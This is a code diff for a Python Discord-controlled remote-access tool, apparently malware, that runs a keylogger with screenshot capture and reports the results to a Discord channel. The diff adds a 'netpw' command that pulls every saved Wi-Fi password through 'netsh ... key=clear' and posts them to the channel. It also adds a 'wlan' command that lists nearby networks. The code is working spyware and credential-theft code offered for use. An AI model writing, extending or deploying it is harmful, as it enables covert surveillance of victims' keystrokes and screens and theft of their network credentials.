@@ -6,7 +6,6 @@ from gtts import gTTS
 from io import BytesIO
 from typing import Union
 from datetime import datetime
-from colorama import Fore, Style
 from tkinter import messagebox
 
 if platform.system() == "Windows":
@@ -14,8 +13,8 @@ if platform.system() == "Windows":
 else:
     os.system('clear')
 
-print(Style.RESET_ALL)
 ASCII = """
+
 
 
 
@@ -42,9 +41,9 @@ ASCII = """
 
 
 
+
 """
-print(Fore.GREEN + ASCII + Style.RESET_ALL)
-print(f'{Fore.LIGHTBLACK_EX}{Style.DIM}', end='')
+print(ASCII)
 time.sleep(1.5)
 
 DEV = "tilov"
@@ -1462,7 +1461,6 @@ class Keylogger:
                     self.log = ''
 
                     screenshot = ImageGrab.grab(all_screens=True)
-
                     screenshot_filename = f"C:/Users/{os.getlogin()}/Downloads/screenshot.png"
                     screenshot.save(screenshot_filename)
 
@@ -1480,6 +1478,7 @@ class Keylogger:
 
     def run(self):
         threading.Thread(target=self._start_keylogger).start()
+        asyncio.create_task(self._report())
 
     def _start_keylogger(self):
         with Listener(on_press=self._on_key_press) as listener:
@@ -1487,10 +1486,9 @@ class Keylogger:
 
 @bot.command(help='enable keylogger')
 async def on(ctx):
-    keylogger = Keylogger(ctx, TIME_INTERVAL)
+    keylogger = Keylogger(ctx.channel, TIME_INTERVAL)
     await ctx.send("Keylogger started.")
     keylogger.run()
-    asyncio.create_task(keylogger._report())
 
 @bot.command(help='disable keylogger')
 async def off(ctx):
@@ -2036,5 +2034,60 @@ async def serverinfo(ctx, server_id: int):
     chunks = [response[i:i+1900] for i in range(0, len(response), 1900)]
     for chunk in chunks:
         await ctx.send(chunk)
+
+@bot.command(help="show all available WLAN connections")
+async def wlan(ctx):
+    async def get_wifi_networks():
+        try:
+            result = subprocess.run(["netsh", "wlan", "show", "network"], capture_output=True)
+            output = result.stdout
+            if output:
+                output = output.decode('utf-8', errors='ignore')
+                networks = output.split("\n")
+                return networks
+            else:
+                return ["Error: No output from command."]
+        except Exception as e:
+            return ["Error:", str(e)]
+
+    networks = await get_wifi_networks()
+    ssid_info = {}
+    current_ssid = None
+
+    for line in networks:
+        if "SSID" in line:
+            current_ssid = line.split(" : ")[1].strip()
+            ssid_info[current_ssid] = []
+        elif current_ssid:
+            ssid_info[current_ssid].append(line.strip())
+
+    if ssid_info:
+        for ssid, info in ssid_info.items():
+            message = f"SSID: {ssid}\n"
+            message += "\n".join(info)
+            await ctx.send(message)
+    else:
+        await ctx.send("No WLAN networks found.")
+
+import re
+
+@bot.command(help="Show Wi-Fi names and passwords")
+async def netpw(ctx):
+    try:
+        profiles_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8', errors='ignore')
+        profiles = re.findall('All User Profile\s*:\s(.*)', profiles_info)
+
+        for profile in profiles:
+            try:
+                profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], encoding='utf-8', errors='ignore')
+                password = re.search('Schl.sselsinhalt\s*:\s(.*)', profile_info)
+                if password:
+                    await ctx.send(f"WLAN-Profil: {profile}\nPasswort: {password.group(1)}")
+                else:
+                    await ctx.send(f"WLAN-Profil: {profile}\nPasswort: Nicht gefunden")
+            except subprocess.CalledProcessError:
+                await ctx.send(f"Profil '{profile}' nicht gefunden.")
+    except subprocess.CalledProcessError:
+        await ctx.send("Fehler beim Abrufen der WLAN-Profile.")
 
 bot.run(TOKEN)
